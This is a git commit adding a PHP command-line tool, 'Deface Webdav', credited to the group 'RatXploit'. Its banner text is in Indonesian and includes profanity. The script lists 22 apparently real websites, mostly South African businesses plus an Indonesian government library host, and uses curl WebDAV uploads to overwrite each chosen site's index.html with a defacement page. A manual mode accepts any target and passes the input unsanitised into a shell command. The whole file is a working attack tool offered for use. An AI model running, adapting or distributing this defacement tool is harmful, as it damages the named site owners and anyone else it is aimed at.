2e9ba9283a3363b535969402f3cc5fc5e8dc7d76
koceng1 <krianhacker@gmail.com>
2019-07-08 05:46:35 +0700

    sdcard/project

---
+++ T.php
@@ -0,0 +1,275 @@
+<?php
+$black = "\e[0;30m";
+$blue = "\e[0;34m";
+$green = "\e[0;32m";
+$cyan = "\e[0;36m";
+$red = "\e[0;31m";
+$purple = "\e[0;35m";
+$brown =  "\e[0;33m";
+$lightgray = "\e[0;37m";
+$darkgray = "\e[1;30m";
+$lightblue = "\e[1;34m";
+$lightgreen = "\e[1;32m";
+$lightcyan = "\e[1;36m";
+$lightred = "\e[1;31m";
+$lightpurple = "\e[1;35m";
+$yellow = "\e[1;33m";
+$white = "\e[1;37m";
+$nc = "\e[0m";
+
+
+system('clear');
+echo "$darkgray 
+ ╭━━━━━━━╮
+ ┃ ● ══  ┃              🇼 🇪 🇱 🇨 🇴 🇲 🇪 $darkgray
+ ┃███████┃
+ ┃███████┃  $darkgray # $yellow Coded   : $cyan ./d0r1s$darkgray
+ ┃███████┃  $darkgray # $yellow Team    : $cyan RatXploit$darkgray
+ ┃███████┃  $darkgray # $yellow Dilarang untuk merecode kontol $darkgray
+ ┃███████┃  $darkgray # $yellow Pegel COK $yellow Ngetik Akeh $darkgray
+ ┃███████┃  $darkgray # $yellow Mikir Pake Otak!$darkgray
+ ┃███████┃$darkgray
+ ┃███████┃  $cyan © copyrigt 2019$darkgray
+ ┃   ○   ┃  $cyan RatXploit$darkgray
+ ╰━━━━━━━╯\n";
+echo "$green Deface Webdav$yellow 2019\n";
+echo "$green Update Version$yellow 3.1\n\n";
+echo "$green Otomatis/Manual? (o/m) :$blue ";
+$pilih = trim(fgets(STDIN));
+if ($pilih == 'o')
+{
+echo " LOADING.......\n";
+sleep(2);
+echo "$red [+] NOTE:$yellow Simpan File Deface dengan nama index.html\n";
+echo "$blue [1] http://windmillsandporcupines.co.za
+ [2] http://scnc.co.za
+ [3] http://contsol.co.za
+ [4] http://colourfactory.co.za
+ [5] http://ayk.co.za
+ [6] http://daretogowildafrica.co.za
+ [7] http://floralandfresh.co.za
+ [8] http://foodconsult.co.za
+ [9] http://itsengineering.co.za
+ [10] http://holotropicbreathwork.co.za
+ [11] http://bitsandpieces.co.za
+ [12] http://mestern.co.za
+ [13] http://inlislitev3.perpusnas.go.id
+ [14] http://gordonhoward.co.za
+ [15] http://esfml.com
+ [16] http://lucaniphysio.co.za
+ [17] http://allpaint.co.za
+ [18] http://www.studentsonline.co.za
+ [19] http://www.pipelinetape.co.za
+ [20] http://www.thepremiummakers.com
+ [21] http://tressor.co.za
+ [22] http://essentialtours.com
+ $red#Project ini dibuat oleh ./d0r1s\n\n";
+echo "$yellow Pilih Web Yang Ingin Di Cium :$blue ";
+$deface = trim(fgets(STDIN));
+if ($deface == "1")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://windmillsandporcupines.co.za');
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://windmillsandporcupines.co.za/index.html\n";
+}
+if ($deface == "2")
+{
+echo "$green LOADING.....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://scnc.co.za') ;
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://scnc.co.za/index.html\n";
+}
+if ($deface == "3")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://contsol.co.za');
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://contsol.co.za/index.html\n";
+}
+if ($deface == "4")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://colourfactory.co.za'); 
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://colourfactory.co.za/index.html\n";
+}
+if ($deface == "5")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://ayk.co.za'); 
+echo "[!] Selesai...\n";
+echo "[!] Cek di$blue http://ayk.co.za/index.html\n";
+}
+if ($deface == "6")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://daretogowildafrica.co.za'); 
+echo "[!] Selesai...\n";
+echo "[!] Cek di$blue http://daretogowildafrica.co.za/index.html\n";
+}
+if ($deface == "7")
+{
+echo "$green LOADING....\n";
+sleep(1);
+system('curl -T /storage/emulated/0/index.html http://floralandfresh.co.za'); 
+echo "[!] Selesai...\n";
+echo "[!] Cek di$blue http://floralandfresh.co.za/index.html\n";
+}
+if ($deface == "8")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://foodconsult.co.za');
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://foodconsult.co.za/index.html\n";
+}
+if ($deface == "9")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://itsengineering.co.za');
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://itsengineering.co.za/index.html\n";
+}
+if ($deface == "10")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://holotropicbreathwork.co.za'); 
+echo "[!] Selesai...\n";
+echo "[!] Cek di$blue http://holotropicbreathwork.co.za/index.html\n";
+}
+if ($deface == "11")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://bitsandpieces.co.za');
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://bitsandpieces.co.za/index.html\n";
+}
+if ($deface == "12")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://mestern.co.za');
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://mestern.co.za/index.html\n";
+}
+if ($deface == "13")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://inlislitev3.perpusnas.go.id');
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://inlislitev3.perpusnas.go.id/index.html\n";
+}
+if ($deface == "14")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://gordonhoward.co.za');
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://gordonhoward.co.za/index.html\n";
+}
+if ($deface == "15")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://esfml.com');
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://esfml.com/index.html\n";
+}
+if ($deface == "16")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://lucaniphysio.co.za');
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://lucaniphysio.co.za/index.html\n";
+}
+if ($deface == "17")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://allpaint.co.za');
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://allpaint.co.za/index.html\n";
+}
+if ($deface == "18")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://www.studentsonline.co.za');
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://www.studentsonline.co.za/index.html\n";
+}
+if ($deface == "19")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://www.pipelinetape.co.za');
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://www.pipelinetape.co.za/index.html\n";
+}
+if ($deface == "20")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://www.thepremiummakers.com');
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://www.thepremiummakers.com/index.html\n";
+}
+if ($deface == "21")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://tressor.co.za');
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://tressor.co.za/index.html\n";
+}
+if ($deface == "22")
+{
+echo "$green LOADING....\n";
+sleep(2);
+system('curl -T /storage/emulated/0/index.html http://essentialtours.com');
+echo "[!]$green Selesai...\n";
+echo "[!] Cek di$blue http://essentialtours.com/index.html\n";
+}
+}
+
+if ($pilih == "m")
+{
+system('clear');
+echo "$darkgray 
+ ╭━━━━━━━╮
+ ┃ ● ══  ┃             🇼 🇪 🇱 🇨 🇴 🇲 🇪$darkgray
+ ┃███████┃
+ ┃███████┃  $darkgray # $yellow Coded   : $cyan ./d0r1s$darkgray
+ ┃███████┃  $darkgray # $yellow Team    : $cyan RatXploit$darkgray
+ ┃███████┃  $darkgray # $yellow Dilarang untuk merecode kontol$darkgray
+ ┃███████┃  $darkgray # $yellow Pegel COK $yellow Ngetik Akeh$darkgray
+ ┃███████┃  $darkgray # $yellow Mikir Pake Otak!$darkgray
+ ┃███████┃$darkgray
+ ┃███████┃  $cyan © copyrigt 2019$darkgray
+ ┃   ○   ┃  $cyan RatXploit$darkgray
+ ╰━━━━━━━╯\n";
+ 
+echo "$green Masuk Kebagian Manual\n";
+echo " Note :$red Taruh Script Deface Di Internal\n\n";
+echo "$green Masukan Website Target :$blue ";
+$ke1 = trim(fgets(STDIN));
+echo "$green Masukan Nama Script Defacenya :$blue ";
+$ke2 = trim(fgets(STDIN));
+ 
+system("curl -T /storage/emulated/0/$ke2 $ke1");
+echo "$green Selesai...\n";
+echo " Cek di$blue $ke1/$ke2.html\n\e[0m";
+}
+?>
